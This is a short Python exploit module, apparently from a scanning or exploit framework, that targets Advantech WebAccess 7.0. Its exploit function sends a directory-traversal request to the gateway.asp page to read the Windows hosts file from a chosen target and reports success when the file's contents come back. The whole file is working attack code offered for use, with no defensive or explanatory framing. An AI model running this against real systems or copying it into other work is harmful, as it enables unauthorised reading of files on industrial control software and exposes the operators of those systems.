import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int = 80):
    """
    Advantech WebAccess 7.0 â€“ Ruben Santamarta
    """
    url = f"http://{target}:{port}/broadweb/system/gateway.asp?../windows/system32/drivers/etc/hosts"
    try:
        r = requests.get(url, timeout=5)
        if "localhost" in r.text:
            logger.info("[+] WebAccess directory traversal succeeded")
            return True
    except Exception as e:
        logger.error(f"WebAccess dir traversal error: {e}")
    return False